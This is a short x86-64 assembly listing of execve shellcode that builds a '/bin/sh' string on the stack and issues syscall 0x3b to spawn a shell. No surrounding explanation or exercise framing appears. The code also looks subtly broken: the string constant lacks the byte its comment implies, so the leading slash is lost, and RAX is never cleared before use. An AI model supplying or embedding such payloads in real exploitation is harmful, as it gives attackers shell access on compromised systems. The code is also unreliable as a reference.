section .text
 global _start
 
_start:
 xor     rdx, rdx
 mov qword rbx, 0x68732f6e69622f ; '//bin/sh'
 shr     rbx, 0x8
 push    rbx
 mov     rdi, rsp
 push    rax
 push    rdi
 mov     rsi, rsp
 mov     al, 0x3b
 syscall